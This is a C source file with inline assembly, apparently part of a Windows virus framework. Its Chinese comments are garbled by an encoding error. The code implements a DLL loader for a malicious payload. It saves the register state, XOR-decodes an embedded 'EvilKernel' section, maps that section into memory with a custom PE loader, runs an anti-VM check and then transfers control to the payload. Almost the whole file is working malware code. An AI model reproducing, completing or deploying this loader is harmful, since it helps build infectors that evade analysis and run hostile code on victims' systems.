#include "xVirusDll.h"
#include "EvilKernel.h"
#include <Windows.h>

#include "..\Common\xVirusSupport.c"

/*
 * ȫ�ֱ���
 */
XVIRUSDLL_ARG g_xVirusDllArg = {0};

/*
 * ����������
 */
__bool __API__ xVirusRun(__dword hModule, __dword ul_reason_for_call, __memory lpReserved) {
	/*
	 * ������Ҫ�������DLL���ڴ�
	 */
	PIMAGE_NT_HEADERS pNtHdr = NULL;
	PIMAGE_SECTION_HEADER pEvilSectionHdr = NULL;
	__memory pMem = NULL;
#if defined(__PRINT_DBG_INFO__)
	__dword dwPrintDbgInfoHandle = 0;
#endif

#if defined(__PRINT_DBG_INFO__)
	dwPrintDbgInfoHandle = __PrintDbgInfo_RecordToFileInit__("xVirusDllLog.txt");
#endif

	__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get basic information\r\n");
	pMem = (__memory)hModule;
	pNtHdr = __GetNtHeader__(pMem);
	pEvilSectionHdr = GetEvilSectionHeader(pNtHdr);

	/*
	 * ȡ����������DLL
	 * ��ͨ��PE LOADER������ص��ڴ�
	 * ִ�в���ִ��DLL
	 */
	__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get EvilKernel && load it to memory\r\n");
	{
		__integer iEvilKernelSize = 0;
		__memory pEvilKernel = NULL;
		__memory pEvilKernelBuffer = NULL;
		__dword dwKey = 0;//����а����ĵ���Կ

		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get EvilKernel decode key\r\n");
		/*
		 * ����а����ĵĽ���KEY
		 */
		dwKey = __XVIRUS_DLL_DECODE_KEY__;
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "EvilKernel decode key = ");
		__PrintDbgInfo_RecordIntegerToFile__(dwPrintDbgInfoHandle, dwKey);
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "\r\n");

		// ����а�����
		pEvilKernel = pMem + pEvilSectionHdr->VirtualAddress;
		iEvilKernelSize = pEvilSectionHdr->Misc.VirtualSize;
		pEvilKernelBuffer = __logic_new_size__(iEvilKernelSize);
		if (!pEvilKernelBuffer) return FALSE;
		XorArray(dwKey, pEvilKernel, pEvilKernelBuffer, iEvilKernelSize);
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Decode EvilKernel completed\r\n");
		/*
		 * ��а������͵�����ȥ�ĵط�
		 */
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Load EvilKernel to memory\r\n");
		{
			__memory pEvilKernelRuntime = NULL;
			__integer iEvilKernelImageBase = 0;
			PIMAGE_NT_HEADERS pEvilKernelNtHdr = NULL;
			pEvilKernelNtHdr = __GetNtHeader__(pEvilKernelBuffer);
			iEvilKernelImageBase = pEvilKernelNtHdr->OptionalHeader.SizeOfImage;
			pEvilKernelRuntime = (__memory)__logic_new_size__(iEvilKernelImageBase);
			/*
			 * ׼��PE LOADER
			 */
			{
				FPEvilKernelEntry pEvilKernelEntry = NULL;
				__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Already LoaderEvilKernel(pEvilKernelBuffer, pEvilKernelRuntime, iEvilKernelImageBase)\r\n");
				pEvilKernelEntry = LoaderEvilKernel(pEvilKernelBuffer, pEvilKernelRuntime, iEvilKernelImageBase);
				if (!pEvilKernelEntry)
					return FALSE;
				// ִ��а�����
				__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Invoke EvilKernel dllmain\r\n");
				__logic_delete__(pEvilKernelBuffer);
				// �Կ������
				AntiVM1();
				return pEvilKernelEntry((__dword)pEvilKernelRuntime, ul_reason_for_call, (__memory)&g_xVirusDllArg);
			}
		}
	}

	/*
	 * ����Ĵ��붼���ᱻִ��,���ǳ���
	 */

	return TRUE;
}

/*
 * ������ΪҪ���ص�ԭʼ�ĵ��õ�ַ,����Ҫ��¼ԭ�ȵķ��ص�ַ
 * ȡ�÷��ص�ַ������Ӳ���뼼��
 */
__dword g_dwOrigEsp = 0;
__dword g_dwOrigEbp = 0;
__dword g_dwOrigEsi = 0;
__dword g_dwOrigEdi = 0;
__dword g_dwOrigEbx = 0;
__dword g_dwOrigEdx = 0;
__dword g_dwOrigEcx = 0;
__bool __API__ xDllMain(__dword hModule, __dword ul_reason_for_call, __memory lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		// ��¼ԭʼֵ
		g_xVirusDllArg.dwOrigEbp = g_dwOrigEbp;
		g_xVirusDllArg.dwOrigEsp = g_dwOrigEsp;
		g_xVirusDllArg.dwOrigEbx = g_dwOrigEbx;
		g_xVirusDllArg.dwOrigEdx = g_dwOrigEdx;
		g_xVirusDllArg.dwOrigEcx = g_dwOrigEcx;
		g_xVirusDllArg.dwOrigEdi = g_dwOrigEdi;
		g_xVirusDllArg.dwOrigEsi = g_dwOrigEsi;
		g_xVirusDllArg.addrOrigImageBase = (__address)hModule;
		xVirusRun(hModule, ul_reason_for_call, lpReserved);
		// ��Զ���ز�������
		return TRUE;
	break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}

__bool __API__ DllMain(__dword hModule, __dword ul_reason_for_call, __memory lpReserved) {
	__asm {
		;; int 3
		;; ���뵽ָ��DLL���
		jmp xDllMain
	}
}

/*
 * ���������Լ�����
 */
__offset g_ofOrigEntryAddressRva = 0x19831210;//ԭʼ��ڵ�ƫ��
// ������LoadLibraryִ�к����ڵ�
__void __NAKED__ DllStartup(/*__dword hModule, __dword ul_reason_for_call, __memory lpReserved*/) {
	__asm {
		;;int 3
		;; ����Ҫ��¼����ԭʼ�ļĴ���ֵ
		mov g_dwOrigEsp, esp
		mov g_dwOrigEbp, ebp
		mov g_dwOrigEsi, esi
		mov g_dwOrigEdi, edi
		mov g_dwOrigEbx, ebx
		mov g_dwOrigEdx, edx
		mov g_dwOrigEcx, ecx
		jmp DllMain												; ֱ�����뵽��ں���,�Թ�Startup����
		retn 0x0C
	}
}
